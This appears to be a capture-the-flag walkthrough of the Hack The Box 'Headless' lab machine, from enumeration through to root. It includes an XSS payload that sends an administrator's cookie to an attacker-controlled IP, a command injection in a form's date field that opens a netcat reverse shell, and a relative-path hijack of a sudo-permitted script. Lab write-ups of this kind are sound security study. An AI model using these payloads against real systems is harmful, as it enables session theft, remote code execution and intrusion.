## HTB - HEADLESS
## LINUX - EASY
## 10.10.11.8 
------------------------------------------------------------------------
### ENUM
#### NMAP
```bash
sudo nmap -v -sC -sV -oA initial --min-rate 1000 10.129.170.0
```
22 : OpenSSH 9.2p1

5000 : Werkzeug/2.2.2 Python/3.11.2
- Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs
```bash
echo 'InVzZXIi' | base64 -d
```
**user**

#### GOBUSTER
```bash
gobuster dir -u http://10.129.67.166:5000 -w /usr/share/wordlists/directory-list-2.3-medium.txt
```
/support              (Status: 200) [Size: 2363]
/dashboard            (Status: 500) [Size: 265]

------------------------------------------------------------------------
### ACTION
#### WEBSITE
1. the webpage http://headless.htb:5000/support is a form. So we try XSS.
**RESULT** 
A message appaers that it detect the hacking tentative and data will be send to the administrator for investigation. In the message we see all infiormation that will be send to the admin.

2. Let's try to CSRF the cookie of the admin. 
3. Intercept the POST request from the support form with Burpsuite.
4. Put a payload in the "user-agent" field : 
```javascript
<script>var i=new Image(); i.src="http://10.10.14.23/?cookie="+btoa(document.cookie);</script>
```
5. Run a webserver
```bash
python3 -m http.server 80
```
6. send the evil request and wait for the connexion
**10.129.67.166 - - [27/Mar/2024 11:38:08] "GET /?cookie=aXNfYWRtaW49SW1Ga2JXbHVJZy5kbXpEa1pORW02Q0swb3lMMWZiTS1TblhwSDA= HTTP/1.1" 200**
7. change the cookie value and go to http://headless.htb:5000/dashboard

8. Accessing the dashboard, we can choose a date and click to submit
9. Intercet the POST request with Burpsuite, we found the variable date.
10. Adding a reverse shell payload after the date : **date=2023-09-15;nc%2010.10.14.23%209100%20-e%20%2Fbin%2Fsh**
11. We have a shell.

#### REVSHELL
1. Stabilize the shell
2. Go to the home directory of the user "dvir", we found *flag.txt*
3. Upload and run Linpeas.
**FOUND**
User dvir may run the following commands on headless:
    (ALL) NOPASSWD: /usr/bin/syscheck

131912      4 -rw-r--r--   1 root     mail          772 Sep 10  2023 /var/mail/dvir
131912      4 -rw-r--r--   1 root     mail          772 Sep 10  2023 /var/spool/mail/dvir
**MAIL FOUND**
```
Subject: Important Update: New System Check Script

Hello!

We have an important update regarding our server. In response to recent compatibility and crashing issues, we've introduced a new system check script.

What's special for you?
- You've been granted special privileges to use this script.
- It will help identify and resolve system issues more efficiently.
- It ensures that necessary updates are applied when needed.

Rest assured, this script is at your disposal and won't affect your regular use of the system.

If you have any questions or notice anything unusual, please don't hesitate to reach out to us. We're here to assist you with any concerns.

By the way, we're still waiting on you to create the database initialization script!
Best regards,
Headless
```
4. Take a look at /usr/bin/syscheck. It's a bash file.
5. the script call another script that don't exist on the target. Plus, it call the script without using the absolute path.
6. Create a script named "initdb.sh"  in the current directory with just `/bin/bash`. 
7. run the sudo command :
```bash
sudo /usr/bin/syscheck
```
8. We are root.
